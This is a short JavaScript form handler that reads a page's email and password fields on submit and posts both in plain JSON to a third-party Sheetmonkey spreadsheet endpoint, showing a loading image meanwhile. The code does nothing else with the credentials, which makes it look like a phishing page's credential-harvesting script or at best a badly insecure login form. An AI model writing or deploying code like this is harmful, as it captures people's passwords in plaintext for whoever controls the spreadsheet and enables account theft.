const button = document.querySelector('button');

const addloading = () => {
    button.innerHTML = '<img src="./loading.png" class="loading">';
}

const removeloading = () => {
    button.innerHTML = 'Enviar';
}


const handleSubmit = (event) => {
    event.preventDefault();
    addloading();

    const email = document.querySelector('input[name=email]').value;
    const password = document.querySelector('input[name=password]').value;

    fetch('https://api.sheetmonkey.io/form/qrHxgd1DCj8KQBmvPihda6', {

    method: 'post',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({email , password}),
    }).then(() => removeloading());
}

document.querySelector('form').addEventListener('submit', handleSubmit);



